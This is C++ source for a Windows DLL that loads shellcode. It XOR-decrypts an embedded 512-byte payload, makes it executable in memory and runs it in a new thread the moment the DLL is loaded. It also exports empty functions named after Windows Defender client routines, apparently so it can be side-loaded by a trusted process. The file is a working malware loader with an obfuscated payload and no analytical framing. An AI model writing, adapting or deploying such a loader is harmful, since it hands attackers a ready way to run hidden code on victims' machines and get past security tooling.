#include <windows.h>
#include <windows.h>
#include <iostream>

#pragma comment (lib, "User32.lib")

const std::string key = "og0tj48ivugnt04bum";
const size_t shellcode_size = 512;
unsigned char encrypted_shellcode[] = "\x93\x2f\xb3\x90\x9a\xdc\xf4\x69\x76\x75\x26\x3f\x35\x60\x66\x2a\x44\xbf\xa\x2f\xbb\x26\xa\x7c\xb3\x3b\x6e\x24\x31\x26\xff\x62\x14\x2a\xfe\x1f\x3f\x2a\x1\xbd\x22\x3b\x8f\x23\x3c\x3d\x56\xae\xd8\xc\x55\x1e\x77\x41\x4f\x26\xf1\xbd\x67\x75\x39\xa8\x94\x98\x35\x26\xff\x62\x14\xe9\x37\x51\x2e\x36\x78\x75\xba\x52\xb9\x11\x6e\x7e\x65\x61\xf1\x42\x34\x62\x75\xe6\xef\xef\x30\x74\x6a\x7c\xbd\xa9\x2\x12\x2f\x6f\xa4\x60\x70\xe9\x35\x4d\x26\x66\xe0\xff\x22\x2c\xdb\x3f\x3e\x8a\xae\x2f\xff\x4\xbc\x2f\x44\xa4\x27\x66\xe6\x3c\x5b\xf4\x79\xa8\xbf\x78\xcb\x2f\x75\xf1\xc\x82\x0\x9c\x23\x64\x7c\x50\x62\x71\x1\xb8\x3\xad\x3f\x2a\xff\x70\x10\x2b\x74\xbd\x9\x26\xbb\x78\x22\x70\xb3\x29\x6a\x3c\x66\xbe\x35\xbb\x30\xea\x3d\x6c\xbf\x26\x68\x35\x32\x6a\x61\x33\x37\x2d\x26\x37\x35\x6a\x7c\xe1\x99\x4d\x2e\x35\xcf\x94\x32\x75\x61\x33\x3e\xfe\x75\x87\x3f\xcf\xcb\x9d\x28\x24\xd1\x10\x43\x46\x35\x7\xa\x69\x76\x34\x31\x27\xfd\xd6\x7c\xe3\x99\xcd\x6e\x67\x30\x3d\xe3\xd1\x71\xd5\x74\x75\x45\xad\xfd\x88\xd3\x12\x34\x39\x26\xee\xd4\x38\xe3\xc5\x79\xd3\x3a\x2\x41\x69\x8b\xe5\x78\xeb\x9f\x5\x6e\x66\x30\x74\x33\x75\x82\x40\xf6\x1e\x67\x91\xa1\x5a\x3e\x23\x2b\x3d\x3f\x2a\x1\xbd\x27\x5\xf8\x21\x89\xb5\x2f\xe7\xb6\x78\xcb\xa2\x3d\xe4\xae\x26\x8a\x9e\x65\xeb\xd8\x96\xa3\x3d\xee\xa9\x1e\x20\x75\x3a\x39\xe4\x8d\x2f\xb9\x8d\x2b\x8e\xa1\xcc\x2\x14\x98\xbb\xf1\xf0\x40\x68\x3c\x92\xa1\x12\xd5\x9c\xf9\x34\x38\x69\x3e\xf6\x8b\x7e\x3c\xb9\xd6\x2f\x44\xa4\x5\x63\x71\x2c\x22\xbd\xc1\x28\xcc\x77\xbe\xa6\x2b\xcf\xe1\xe1\x8d\x6d\x11\x32\x78\xf7\xae\x14\x66\xe0\x80\x1f\x27\x2f\x2d\x58\x34\x72\x75\x6d\x2e\x3f\x78\xfd\x98\x7c\x9\xa0\x37\xcf\x3f\xca\x27\xd5\xcb\xb7\x3d\xe4\xac\x2e\xb9\xb3\x27\x5\xf1\x20\xff\x85\x2f\xe7\xae\x78\xbd\x9b\x34\xd7\x6d\xbe\xf8\x2b\x95\xe1\xbb\x91\x76\x8\x4f\x36\x35\x67\x6d\xa\x75\x2d\x6f\x67\x71\x2c\x0\x34\x62\x28\xcc\x7e\x48\x61\x44\xcf\xe1\x35\x2c\x2c\xd5\x12\x5e\x39\xb\xcb\xed\x20\x89\xbb\x8e\x52\x8b\xcf\xcb\x2a\x74\xae\x27\x4e\xf6\x3c\xef\xc2\x4d\xdd\x37\x8a\x80\x36\x1e\x30\x6d\xd9\x95\x70\x45\x6d\x71\xfd\xb0\xcb\xed\x69";

// Decryption logic
void xor_decrypt(unsigned char* data, size_t size, const std::string& key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key.size()];
    }
}

int executeMessage(){
    std::cout << "[+] Starting shellcode decryption and execution...\n";

    xor_decrypt(encrypted_shellcode, shellcode_size, key);

    void* exec_mem = VirtualAlloc(nullptr, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) {
        std::cerr << "[-] Memory allocation failed\n";
        return 1;
    }
    std::cout << "[+] VirtualAlloc success\n";

    memcpy(exec_mem, encrypted_shellcode, shellcode_size);
    std::cout << "[+] memcpy success\n";

    DWORD oldProtect;
    if (!VirtualProtect(exec_mem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "[-] Failed to change memory permissions\n";
        return 1;
    }

    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec_mem, nullptr, 0, nullptr);
    if (!hThread) {
        std::cerr << "[-] Thread creation failed\n";
        return 1;
    }
    std::cout << "[+] CreatThread success\n";

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        executeMessage();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


extern "C" __declspec(dllexport) void MpConfigClose() {}
extern "C" __declspec(dllexport) void MpConfigGetValueAlloc() {}
extern "C" __declspec(dllexport) void MpHandleClose() {}
extern "C" __declspec(dllexport) void MpNotificationRegister() {}
extern "C" __declspec(dllexport) void MpManagerOpen() {}
extern "C" __declspec(dllexport) void MpFreeMemory() {}
extern "C" __declspec(dllexport) void MpConfigUninitialize() {}
extern "C" __declspec(dllexport) void MpConfigOpen() {}
extern "C" __declspec(dllexport) void MpConfigInitialize() {}
extern "C" __declspec(dllexport) void MpClientUtilExportFunctions() {}
extern "C" __declspec(dllexport) void MpUtilsExportFunctions() {}